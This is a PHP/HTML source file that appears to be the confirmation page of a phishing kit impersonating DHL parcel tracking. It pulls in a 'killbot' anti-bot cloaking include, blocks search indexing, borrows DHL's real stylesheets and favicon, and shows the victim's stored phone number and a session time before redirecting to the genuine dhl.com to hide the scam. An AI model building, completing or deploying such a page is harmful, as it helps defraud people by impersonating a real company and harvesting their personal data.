<?php

session_start();
include "../assets/functions.php";
include '../server/traduction.php';
include_once('../settings.php');
include_once('../server/killbot.to.php');

?>



<!DOCTYPE html>
<html lang="fr-FR" dir="ltr">

<head>
<title><?php echo $translations[$lang]["titre_succes"]; ?></title> 
	<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">
	<meta http-equiv="refresh" content="5; url=https://dhl.com">
	<meta name="viewport" content="width=device-width" />

	<link rel="icon" href="../assets/images/A1Ywhbg3Xes8.png">
	<meta charSet="utf-8" />
	<noscript data-n-css=""></noscript>
	<link rel="icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico"
		type="image/x-icon" />

	<!--CSS-->
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-logic.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-ui.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet" href="https://www.dhl.com/etc.clientlibs/dhl/clientlibs/clientlib-core.min.css"
		type="text/css">



</head>
<header>

	<?php include '../assets/header.php'; ?>
</header>

<br>
<br>




<body class="no-js  ">
	<!--googleoff: all-->
	
	
	
	

		




</div>
		<div class="js--tracking-result--container c-tracking-result--container  is-visible">


		<!-- global status class -->
		<div class=" l-grid ">

			<!-- header -->
			<div class="c-tracking-result--header l-grid.centered-form ">

				<!-- message only -->

					<form method ="post" action = "" name = "message_form" >
					<div class="c-tracking-result--section c-tracking-result--info">
					<div class="">					

					</div>					
					<div>
					<center><img src = "https://cdn-icons-png.flaticon.com/512/32/32175.png" width="25" height =""></center>
						<br>
						<center><h5 class="c-tracking-result--code level4.centered-form" aria-hidden="true">
						<?php echo $translations[$lang]["titre_succes1"]; ?> <?php '' ?>  <?php echo $_SESSION['heure']?></h5>
						</center></h5>
								
						
						<span class="is-hidden"></span>

						<span class="c-tracking-result-message--content l-grid--left-s" data-fix-hogan-key="metadata.serviceId" data-fix-hogan-value="">

						<p>
						<?php echo $translations[$lang]["titre_succes2"]; ?> <?php echo $_SESSION["tel"];		?>
						</p>

							
							
						</span>
					</div>
				</div>
				

				<!-- detail view -->
			</div>
		</div>

</div>

	</div>
					<div class="js--tracking-result--a11y-container sr-only" aria-live="polite" aria-atomic="true">
					</div>
					<div
						class="js--tracking-result--container c-tracking-result--container l-grid--w-100pc-s  l-grid--w-100pc-m ">
					</div>
				</div>
			</div>
			<div class="c-tracking-result--error-specific">
				<span class="link-anchor" id="track-trace-error-par_text_generic_copy_co"></span>
				<div class="component-margin c-text-generic has-rte component-small l-grid--left-s l-grid--center-m">
					<div class="has-rte">
						<p class="has-rte">
							Powered by the
							<a href="https://developer.dhl.com/api-reference/shipment-tracking#get-started-section/overview"
								target="_blank" class="link link-external link-red has-icon"
								rel="noopener noreferrer">Shipment Tracking - Unified API</a>
						</p>
					</div>
				</div>
				<span class="link-anchor" id="track-trace-error-par_horizontal_ruler"></span>
				<div class="c-horizontal-ruler component-margin  ">
					<hr class="c-horizontal-ruler--wide" />
				</div>
			</div>
			<div class="c-tracking-result--success-specific"></div>
			<span class="link-anchor" id="parsysPath_text_generic_copy"></span>
			<div class="component-margin c-text-generic has-rte component-small ">
				<div class="has-rte">
					<p class="has-rte">
						<i></i>
					</p>
					<p class="has-rte"></p>
					<p class="has-rte"></p>
				</div>
			</div>
			<span class="link-anchor" id="parsysPath_horizontal_ruler_cop"></span>
			<div class="c-horizontal-ruler component-margin  ">
				<hr class="c-horizontal-ruler--wide" />
			</div>
			<div class="xf-content-height">
				<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
					<span class="link-anchor" id="root_code_inclusion"></span>
					<div class="c-code-inclusion component-margin  component-small  ">
						<div class="c-code-inclusion--container">

						</div>
					</div>
				</div>
			</div>
		</main>



		<footer>
			<?php //include '../assets/footer.php'; ?>
		</footer>


		<style>
        /* Ajoutez du CSS pour centrer le contenu */
       

        .centered-form {
            text-align: center;
        }

        .c-tracking-result--container {
            /* Styles pour le conteneur */
        }

        /* Ajoutez d'autres styles CSS pour le reste du contenu si nécessaire */
    </style>
		